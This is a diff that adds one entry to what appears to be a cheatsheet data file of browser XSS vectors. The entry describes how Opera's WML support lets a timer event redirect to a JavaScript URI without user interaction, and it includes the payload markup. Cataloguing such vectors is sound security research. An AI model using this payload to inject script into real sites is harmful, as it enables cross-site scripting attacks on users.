@@ -2161,5 +2161,34 @@ var items =
         },
         'tags'       : ['xss', 'javascript', 'xlinks', 'firefox', 'xml'],
         'reporter'   : '.mario'
+    },
+    { /* ID 69 - Opera WML JavaScript execution via timer event */
+        'id'         : 69,
+        'category'   : 'xml', 
+        'name'       : {
+            'en' : 'Opera WML JavaScript execution via timer event',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },
+        'data'       : '<card><onevent type="ontimer"><go href="%js_uri_alert%"/></onevent><timer value="1"/></card>',
+        'description': {
+            'en' : 'Opera supports WML files - Wireless Markup Language. As soon as a file has the extension .wml Opera assumes it\'s a WML file and renders it accordingly. With a timer event and a connected redirect it\'s possible to execute JavaScript without user interaction.', 
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },
+        'urls'    : ['http://www.w3schools.com/wmlscript/default.asp'],
+        'howtofix'   : {
+            'en' : '',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },                        
+        'browsers'   : {
+            'opera': ['9.x', '10.x', 'mobile']
+        },
+        'tags'       : ['xss', 'javascript', 'wmlscript', 'wml', 'opera', 'mobile', 'timer'],
+        'reporter'   : '.mario'
     }
 ]
